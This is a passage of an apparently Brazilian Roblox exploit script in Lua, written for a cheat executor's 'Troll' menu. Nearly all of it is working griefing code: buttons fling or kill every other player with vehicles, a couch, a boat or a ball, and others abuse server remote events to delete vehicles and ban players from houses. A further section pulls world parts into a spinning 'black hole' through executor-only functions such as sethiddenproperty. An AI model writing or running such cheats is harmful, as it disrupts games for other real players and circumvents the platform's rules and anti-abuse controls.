		while alvoAtual and alvoAtual.Character and alvoAtual.Character:FindFirstChild("Humanoid") do
			task.wait(0.05)
			if alvoAtual.Character.Humanoid.SeatPart then
				local buraco = CFrame.new(265.46, -450.83, -59.93)
				alvoAtual.Character.HumanoidRootPart.CFrame = buraco
				eu.Character.HumanoidRootPart.CFrame = buraco
				task.wait(0.4)
				limparSofa()
				task.wait(0.2)
				if posInicial then
					eu.Character.HumanoidRootPart.CFrame = posInicial
				end
				break
			end
		end
	end)
end

entrada.TouchTap:Connect(function(toques, processado)
	if not ferramentaEquipada or processado then return end
	local pos = toques[1]
	local raio = cam:ScreenPointToRay(pos.X, pos.Y)
	local hit = mundo:Raycast(raio.Origin, raio.Direction * 1000)
	if hit and hit.Instance then
		local modelo = hit.Instance:FindFirstAncestorOfClass("Model")
		local jogador = jogadores:GetPlayerFromCharacter(modelo)
		if jogador and jogador ~= eu then
			arremessarComSofa(jogador)
		end
	end
end)
end
})

local kill = Troll:AddSection({Name = "FLING TODOS"})

Troll:AddButton({
    Name = "ELIMINAR TODOS ÔNIBUS",
    Callback = function()
        local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local destination = Vector3.new(145.51, -374.09, 21.58) 
local originalPosition = nil  

local function GetBus()  
    local vehicles = Workspace:FindFirstChild("Vehicles")  
    if vehicles then  
        return vehicles:FindFirstChild(Players.LocalPlayer.Name.."Car")  
    end  
    return nil  
end  

local function TrackPlayer(selectedPlayerName, callback)
    while true do  
        if selectedPlayerName then  
            local targetPlayer = Players:FindFirstChild(selectedPlayerName)  
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then  
                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")  
                if targetHumanoid and targetHumanoid.Sit then  
                    local bus = GetBus()
                    if bus then
                        bus:SetPrimaryPartCFrame(CFrame.new(destination))   
                        print("Jogador sentou, levando ônibus para o void!")  

                        task.wait(0.2)  

                        local function simulateJump()  
                            local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")  
                            if humanoid then  
                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)  
                            end  
                        end  

                        simulateJump()  
                        print("Simulando primeiro pulo!")  

                        task.wait(0.4)  
                        simulateJump()
                        print("Simulando segundo pulo!")  

                        task.wait(0.5)
                        if originalPosition then
                            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition  
                            print("Player voltou para a posição inicial Xique")  

                            task.wait(0.1)
                            local args = {
                                [1] = "DeleteAllVehicles"
                            }
                            ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
                            print("Todos os veículos foram deletados!")
                        end
                    end
                    break  
                else  
                    local targetRoot = targetPlayer.Character.HumanoidRootPart  
                    local time = tick() * 35
               
                    local lateralOffset = math.sin(time) * 10  -- Movimento lateral rápido  
                    local frontBackOffset = math.cos(time) * 20  -- Movimento frente/trás
                      
                    local bus = GetBus()
                    if bus then
                        bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(0, 0, frontBackOffset))  
                    end
                end  
            end  
        end  
        RunService.RenderStepped:Wait()  
    end
    
    if callback then
        callback()
    end
end  

local function StartKillBusao(playerName, callback)
    local selectedPlayerName = playerName

    local player = Players.LocalPlayer  
    local character = player.Character or player.CharacterAdded:Wait()  
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")  

    originalPosition = humanoidRootPart.CFrame  

    local bus = GetBus()  

    if not bus then  
        humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)  
        task.wait(0.5)  
        local remoteEvent = ReplicatedStorage:FindFirstChild("RE")  
        if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then  
            remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")  
        end  
        task.wait(1)  
        bus = GetBus()  
    end  

    if bus then  
        local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")  
        if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then  
            repeat  
                humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)  
                task.wait()  
            until character.Humanoid.Sit or not bus.Parent  
        end  
    end  

    spawn(function()
        TrackPlayer(selectedPlayerName, callback)
    end)
end

local function PerformActionForAllPlayers(players)
    if #players == 0 then
        return
    end

    local player = table.remove(players, 1)
    StartKillBusao(player.Name, function()
        task.wait(0.5)
        PerformActionForAllPlayers(players)
    end)
end

PerformActionForAllPlayers(Players:GetPlayers())
    end
})
print("Kill All Bus button created")

Troll:AddButton({
    Name = "MATA JOGADOR BAN",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")


local function executeScriptForPlayer(targetPlayer)
    local Player = game.Players.LocalPlayer
    local Backpack = Player.Backpack
    local Character = Player.Character
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Character:FindFirstChild("HumanoidRootPart")
    local Houses = game.Workspace:FindFirstChild("001_Lots")
    local OldPos = RootPart.CFrame
    local Angles = 0
    local Vehicles = Workspace.Vehicles
    local Pos


    function Check()
        if Player and Character and Humanoid and RootPart and Vehicles then
            return true
        else
            return false
        end
    end


    if Check() then
        local House = Houses:FindFirstChild(Player.Name.."House")
        if not House then
            local EHouse
            for _, Lot in pairs(Houses:GetChildren()) do
                if Lot.Name == "For Sale" then
                    for _, num in pairs(Lot:GetDescendants()) do
                        if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                            EHouse = Lot
                            break
                        end
                    end
                end
            end


            local BuyDetector = EHouse:FindFirstChild("BuyHouse")
            Pos = BuyDetector.Position
            if BuyDetector and BuyDetector:IsA("BasePart") then
                RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0, -6, 0)
                task.wait(0.5)
                local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                if ClickDetector then
                    fireclickdetector(ClickDetector)
                end
            end
        end


        task.wait(0.5)
        local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
        if PreHouse then
            task.wait(0.5)
            local Number
            for i, x in pairs(PreHouse:GetDescendants()) do
                if x.Name == "Number" and x:IsA("NumberValue") then
                    Number = x
                end
            end
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", Number.Value)
        end


        task.wait(0.5)
        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if not PCar then
            if Check() then
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                task.wait(0.5)
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end


        task.wait(0.5)
        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if PCar then
            if not Humanoid.Sit then
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end


            local Target = targetPlayer
            local TargetC = Target.Character
            local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
            local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
            if TargetC and TargetH and TargetRP then
                if not TargetH.Sit then
                    while not TargetH.Sit do
                        task.wait()
                        local Fling = function(alvo, pos, angulo)
                            PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                        end
                        Angles = Angles + 100
                        Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP, CFrame.new(2.25, 1.5, -2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                        Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                    end
                    task.wait(0.2)
                    local House = Houses:FindFirstChild(Player.Name.."House")
                    PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))
                    task.wait(0.2)
                    local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30,30,30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30,30,30))
                    local a = workspace:FindPartsInRegion3(pedro, game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)
                    for i, v in pairs(a) do
                        if v.Name == "HumanoidRootPart" then
                            local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)
                            local args = {
                                [1] = "BanPlayerFromHouse",
                                [2] = b,
                                [3] = v.Parent
                            }
                            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
                        end
                    end
                end
            end
        end
    end


    -- Deletar o veículo
    local deleteArgs = {
        [1] = "DeleteAllVehicles"
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(deleteArgs))
end


-- Iterar sobre todos os jogadores no mapa
for _, player in pairs(Players:GetPlayers()) do
    if player ~= Player then
        executeScriptForPlayer(player)
       task.wait(2)
    end
end
    end
})
print("House Ban kill All button created")

Troll:AddButton({
    Name = "FLING TODOS BARCO ",
    Callback = function()
        local Player = game.Players.LocalPlayer
    local Character = Player.Character
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Character:FindFirstChild("HumanoidRootPart")
    local Vehicles = game.Workspace:FindFirstChild("Vehicles")
    local OldPos = RootPart.CFrame
    local Angles = 0
    local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
    
    -- Se nÃ£o tiver um carro, cria um  
            if not PCar then  
                if RootPart then  
                    RootPart.CFrame = CFrame.new(1754, -2, 58)  
                    task.wait(0.5)  
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")  
                    task.wait(0.5)  
                    PCar = Vehicles:FindFirstChild(Player.Name.."Car")  
                    task.wait(0.5)  
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  
                    if Seat then  
                        repeat  
                            task.wait()  
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  
                        until Humanoid.Sit  
                    end  
                end  
            end  
      
            task.wait(0.5)  
            PCar = Vehicles:FindFirstChild(Player.Name.."Car")  
      
            -- Se o carro existir, teletransporta para o assento se necessÃ¡rio  
            if PCar then  
                if not Humanoid.Sit then  
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  
                    if Seat then  
                        repeat  
                            task.wait()  
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  
                        until Humanoid.Sit  
                    end  
                end  
            end  
      
            -- Adiciona o BodyGyro ao carro para controle de movimento  
            local SpinGyro = Instance.new("BodyGyro")  
            SpinGyro.Parent = PCar.PrimaryPart  
            SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)  
            SpinGyro.P = 1e7  
            SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)  
      
            -- FunÃ§Ã£o de Fling em cada jogador por 3 segundos  
            local function flingPlayer(TargetC, TargetRP, TargetH)
    Angles = 0  
                local endTime = tick() + 1  -- Define o tempo final em 2 segundos a partir de agora  
                while tick() < endTime do  
                    Angles = Angles + 100  
                    task.wait()  
      
                    -- Movimentos e Ã¢ngulos para o Fling  
                    local kill = function(alvo, pos, angulo)  
                        PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)  
                    end  
      
                    -- Fling para vÃ¡rias posiÃ§Ãµes ao redor do TargetRP  
                    kill(TargetRP, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(Angles), 0, 0))  
                    kill(TargetRP, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(Angles), 0, 0))  
                    kill(TargetRP, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))  
                    kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))  
                    kill(TargetRP, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  
                    kill(TargetRP, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  
                end  
            end  
      
            -- Itera sobre todos os jogadores  
            for _, Target in pairs(game.Players:GetPlayers()) do  
                -- Pula o jogador local  
                if Target ~= Player then  
                    local TargetC = Target.Character  
                    local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")  
                    local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")  
      
                    -- Se encontrar o alvo e seus componentes, executa o fling  
                    if TargetC and TargetH and TargetRP then  
                        flingPlayer(TargetC, TargetRP, TargetH)  -- Fling no jogador atual  
                    end  
                end  
            end  
      
            -- Retorna o jogador para sua posiÃ§Ã£o original  
            task.wait(0.5)  
            PCar:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))  
            task.wait(0.5)  
            Humanoid.Sit = false  
            task.wait(0.5)  
            RootPart.CFrame = OldPos  
      
            -- Remove o BodyGyro apÃ³s o efeito  
            SpinGyro:Destroy()  
    end
})
print("Fling Boat All button created")

Troll:AddButton({
    Name = "FLING TODOS ARMS",
    Callback = function()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local LocalPlayer = Players.LocalPlayer
    local cam = workspace.CurrentCamera


    local function ProcessPlayer(target)
        if not target or not target.Character or target == LocalPlayer then return end
        
        local flingActive = true
        local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if not root or not tRoot then return end
        
        local char = LocalPlayer.Character
        local hum = char:FindFirstChildOfClass("Humanoid")
        local original = root.CFrame

    
        ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
        task.wait(0.2)

  
        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        task.wait(0.3)

        local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
        if tool then
            tool.Parent = char
        end
task.wait(0.1)

game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
task.wait(0.25)

        workspace.FallenPartsDestroyHeight = 0/0

        local bv = Instance.new("BodyVelocity")
        bv.Name = "FlingForce"
        bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Parent = root

        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        hum.PlatformStand = false
        cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum

 
        task.spawn(function()
            local angle = 0
            local parts = {root}
            while flingActive and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
                local tHum = target.Character:FindFirstChildOfClass("Humanoid")
                if tHum.Sit then break end
                angle += 50

                for _, part in ipairs(parts) do
                    local hrp = target.Character.HumanoidRootPart
                    local pos = hrp.Position + hrp.Velocity / 1.5
                    root.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(angle), 0, 0)
                end

                root.Velocity = Vector3.new(9e8, 9e8, 9e8)
                root.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                task.wait()
            end

         
            flingActive = false
            bv:Destroy()
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            hum.PlatformStand = false
            root.CFrame = original
            cam.CameraSubject = hum

            for _, p in pairs(char:GetDescendants()) do
                if p:IsA("BasePart") then
                    p.Velocity = Vector3.zero
                    p.RotVelocity = Vector3.zero
                end
            end

            hum:UnequipTools()
            ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        end)
       
        while flingActive do
            task.wait()
        end
    end


    for _, player in ipairs(Players:GetPlayers()) do
        ProcessPlayer(player)
			end
    end
})



Troll:AddButton({
    Name = "FLING TODOS BOLA",
    Callback = function()
local player=game:GetService("Players").LocalPlayer
local SoccerBalls=workspace.WorkspaceCom["001_SoccerBalls"]
local MyBall=SoccerBalls:FindFirstChild("Soccer"..player.Name)

if not MyBall then
if not player.Backpack:FindFirstChild("SoccerBall") then
local args={[1]="PickingTools",[2]="SoccerBall"}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
task.wait()
player.Backpack.SoccerBall.Parent=player.Character
repeat MyBall=SoccerBalls:FindFirstChild("Soccer"..player.Name) task.wait() until MyBall
player.Character.SoccerBall.Parent=player.Backpack
task.wait()
else
player.Backpack.SoccerBall.Parent=player.Character
repeat MyBall=SoccerBalls:FindFirstChild("Soccer"..player.Name) task.wait() until MyBall
player.Character.SoccerBall.Parent=player.Backpack
end
end


for i,v in pairs(game.Players:GetPlayers()) do
if v~=game.Players.LocalPlayer then
local target=v
local TCharacter=target.Character or target.CharacterAdded:Wait()
local THumanoidRootPart=TCharacter:WaitForChild("HumanoidRootPart")
if not MyBall or not THumanoidRootPart then return end

for _,v in pairs(MyBall:GetChildren()) do
if v:IsA("BodyMover") then v:Destroy() end
end

local bodyVelocity=Instance.new("BodyVelocity")
bodyVelocity.Velocity=Vector3.new(9e8,9e8,9e8)
bodyVelocity.MaxForce=Vector3.new(1/0,1/0,1/0)
bodyVelocity.P=1e10
bodyVelocity.Parent=MyBall

local bv=Instance.new("BodyVelocity")
bv.Velocity=Vector3.new(9e8,9e8,9e8)
bv.MaxForce=Vector3.new(1/0,1/0,1/0)
bv.P=1e9
bv.Parent=THumanoidRootPart

local oldPos=THumanoidRootPart.Position
workspace.CurrentCamera.CameraSubject=THumanoidRootPart

repeat
local velocity=THumanoidRootPart.Velocity.Magnitude
local parts={}
for _,v in pairs(TCharacter:GetDescendants()) do
if v:IsA("BasePart") and v.CanCollide and not v.Anchored then table.insert(parts,v) end
end
for _,part in ipairs(parts) do
local pos_x=target.Character.HumanoidRootPart.Position.X
local pos_y=target.Character.HumanoidRootPart.Position.Y
local pos_z=target.Character.HumanoidRootPart.Position.Z
pos_x=pos_x+(target.Character.HumanoidRootPart.Velocity.X/1.5)
pos_y=pos_y+(target.Character.HumanoidRootPart.Velocity.Y/1.5)
pos_z=pos_z+(target.Character.HumanoidRootPart.Velocity.Z/1.5)
MyBall.CFrame=CFrame.new(pos_x,pos_y,pos_z)
task.wait(1/6000)
end
task.wait(1/6000)
until THumanoidRootPart.Velocity.Magnitude>5000 or TCharacter.Humanoid.Health==0 or target.Parent~=game.Players or THumanoidRootPart.Parent~=TCharacter or TCharacter~=target.Character

end
end

workspace.CurrentCamera.CameraSubject=game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
  end
})

local kill = Troll:AddSection({Name = "MENU PRAÇA"})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local blackHoleActive = false
local DescendantAddedConnection
local rotationConnection

local Folder = Instance.new("Folder", Workspace)
Folder.Name = "BringPartsFolder"

local Part = Instance.new("Part", Folder)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
Part.Size = Vector3.new(5, 5, 5)
Part.Position = Vector3.new(-26.54624575495172, 4.13895320892334, 3.941930037536621)

local Attachment1 = Instance.new("Attachment", Part)

local function ForcePart(v)
    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid")
        and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in ipairs(v:GetChildren()) do 
            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then 
                x:Destroy() 
            end 
        end
        
        if v:FindFirstChild("Attachment") then 
            v:FindFirstChild("Attachment"):Destroy() 
        end
        
        if v:FindFirstChild("AlignPosition") then 
            v:FindFirstChild("AlignPosition"):Destroy() 
        end
        
        if v:FindFirstChild("Torque") then 
            v:FindFirstChild("Torque"):Destroy() 
        end
        
        v.CanCollide = false
        
        local torque = Instance.new("Torque", v)
        torque.Torque = Vector3.new(9e9, 9e9, 9e9)
        
        local align = Instance.new("AlignPosition", v)
        local att = Instance.new("Attachment", v)
        
        torque.Attachment0 = att
        
        align.MaxForce = 1e12
        align.MaxVelocity = 1e12
        align.Responsiveness = 1e12
        align.Attachment0 = att
        align.Attachment1 = Attachment1
    end 
end

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(1e8, 1e8, 1e8)
    }

    getgenv().Network.RetainPart = function(PartObj) 
        if typeof(PartObj) == "Instance" and PartObj:IsA("BasePart") and PartObj:IsDescendantOf(Workspace) then 
            table.insert(getgenv().Network.BaseParts, PartObj) 
            PartObj.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0) 
            PartObj.CanCollide = false 
        end 
    end
    
    RunService.Heartbeat:Connect(function() 
        pcall(function() 
            sethiddenproperty(Players.LocalPlayer, "SimulationRadius", math.huge) 
        end) 
        for _, part in ipairs(getgenv().Network.BaseParts) do 
            if part:IsDescendantOf(Workspace) then 
                part.Velocity = getgenv().Network.Velocity 
            end 
        end 
    end) 
end

-- Função para travar o personagem na posição
local function travarPersonagem()
    local character = LocalPlayer.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    
    if humanoid and rootPart then
        -- Remove animação de sentar
        humanoid.Sit = false
        
        -- Cria corpo de velocidade zero para travar
        local bodyVelocity = Instance.new("BodyVelocity", rootPart)
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        bodyVelocity.Name = "TravarVelocity"
        
        -- Cria corpo de posição para manter no lugar
        local bodyPosition = Instance.new("BodyPosition", rootPart)
        bodyPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)
        bodyPosition.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        bodyPosition.Name = "TravarPosition"
        
        -- Mantém o personagem travado
        task.spawn(function()
            while blackHoleActive and character and character.Parent do
                task.wait()
                pcall(function()
                    humanoid.Sit = false
                    if rootPart and rootPart:FindFirstChild("TravarPosition") then
                        rootPart.TravarPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)
                    end
                end)
            end
        end)
    end
end

function toggleBlackHole()
    blackHoleActive = not blackHoleActive

    if blackHoleActive then
        -- Teleporta o personagem primeiro
        local character = LocalPlayer.Character
        if character then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.CFrame = CFrame.new(-308.447265625, 42.98085403442383, 94.30621337890625)
            end
        end
        
        -- Trava o personagem
        travarPersonagem()
        
        -- Forçar todas as partes existentes
        for _, v in ipairs(Workspace:GetDescendants()) do 
            ForcePart(v) 
        end
        
        -- Monitorar novas partes
        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v) 
            if blackHoleActive then 
                ForcePart(v) 
            end 
        end)
        
        -- Rotação ultra rápida
        local rotationSpeed = 999999
        local angle = 0
        
        rotationConnection = RunService.RenderStepped:Connect(function()
            if blackHoleActive then
                angle = angle + math.rad(rotationSpeed)
                -- Rotacionar o ponto de ancoragem
                local centerPos = Part.Position
                local newPos = centerPos + Vector3.new(
                    math.sin(angle) * 2,
                    math.cos(angle * 2) * 1,
                    math.cos(angle) * 2
                )
                Attachment1.WorldPosition = newPos
            end
        end)
        
    else
        if DescendantAddedConnection then
            DescendantAddedConnection:Disconnect()
            DescendantAddedConnection = nil
        end
        if rotationConnection then
            rotationConnection:Disconnect()
            rotationConnection = nil
        end
        
        -- Remove os corpos de trava do personagem
        local character = LocalPlayer.Character
        if character then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                if rootPart:FindFirstChild("TravarVelocity") then
                    rootPart.TravarVelocity:Destroy()
                end
                if rootPart:FindFirstChild("TravarPosition") then
                    rootPart.TravarPosition:Destroy()
                end
            end
        end
        
        -- Limpar attachments
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                for _, child in ipairs(v:GetChildren()) do
                    if child:IsA("AlignPosition") or child:IsA("Torque") then
                        child:Destroy()
                    end
                end
            end
        end
    end
end

-- UI sem dropdown
Troll:AddButton({
    Name = "AUTO SPAW ELI",
    Description = "SPAWNA HELI SALVA VIDAS NA PRAÇA",
    Callback = function()
        if not blackHoleActive then
            toggleBlackHole()
            print("SEXO")
        else
            print("  FLING já está ativo")
        end
    end
})

Troll:AddButton({
    Name = "DESATIVAR",
    Callback = function()
        if blackHoleActive then
            toggleBlackHole()
            print("GTVZ")
        else
            print("GTVZ")
        end
    end
})

local kill = Troll:AddSection({Name = "MENU JOGADOR"})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local blackHoleActive = false
local DescendantAddedConnection
local rotationConnection

local Folder = Instance.new("Folder", Workspace)
Folder.Name = "BringPartsFolder"

local Part = Instance.new("Part", Folder)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
Part.Size = Vector3.new(5, 5, 5)

local Attachment1 = Instance.new("Attachment", Part)

local function ForcePart(v)
    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid")
        and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in ipairs(v:GetChildren()) do 
            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then 
                x:Destroy() 
            end 
        end
        
        if v:FindFirstChild("Attachment") then 
            v:FindFirstChild("Attachment"):Destroy() 
        end
        
        if v:FindFirstChild("AlignPosition") then 
            v:FindFirstChild("AlignPosition"):Destroy() 
        end
        
        if v:FindFirstChild("Torque") then 
            v:FindFirstChild("Torque"):Destroy() 
        end
        
        v.CanCollide = false
        
        local torque = Instance.new("Torque", v)
        torque.Torque = Vector3.new(9e9, 9e9, 9e9)
        
        local align = Instance.new("AlignPosition", v)
        local att = Instance.new("Attachment", v)
        
        torque.Attachment0 = att
        
        align.MaxForce = 1e12
        align.MaxVelocity = 1e12
        align.Responsiveness = 1e12
        align.Attachment0 = att
        align.Attachment1 = Attachment1
    end 
end

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(1e8, 1e8, 1e8)
    }

    getgenv().Network.RetainPart = function(PartObj) 
        if typeof(PartObj) == "Instance" and PartObj:IsA("BasePart") and PartObj:IsDescendantOf(Workspace) then 
            table.insert(getgenv().Network.BaseParts, PartObj) 
            PartObj.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0) 
            PartObj.CanCollide = false 
        end 
    end
    
    RunService.Heartbeat:Connect(function() 
        pcall(function() 
            sethiddenproperty(Players.LocalPlayer, "SimulationRadius", math.huge) 
        end) 
        for _, part in ipairs(getgenv().Network.BaseParts) do 
            if part:IsDescendantOf(Workspace) then 
                part.Velocity = getgenv().Network.Velocity 
            end 
        end 
    end) 
end

-- Função para travar o personagem na posição
local function travarPersonagem()
    local character = LocalPlayer.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    
    if humanoid and rootPart then
        -- Remove animação de sentar
        humanoid.Sit = false
        
        -- Cria corpo de velocidade zero para travar
        local bodyVelocity = Instance.new("BodyVelocity", rootPart)
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        bodyVelocity.Name = "TravarVelocity"
        
        -- Cria corpo de posição para manter no lugar
        local bodyPosition = Instance.new("BodyPosition", rootPart)
        bodyPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)
        bodyPosition.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        bodyPosition.Name = "TravarPosition"
        
        -- Mantém o personagem travado
        task.spawn(function()
            while blackHoleActive and character and character.Parent do
                task.wait()
                pcall(function()
                    humanoid.Sit = false
                    if rootPart and rootPart:FindFirstChild("TravarPosition") then
                        rootPart.TravarPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)
                    end
                end)
            end
        end)
    end
end

function toggleBlackHole()
    blackHoleActive = not blackHoleActive

    if blackHoleActive then
        -- Teleporta o personagem primeiro
        local character = LocalPlayer.Character
        if character then
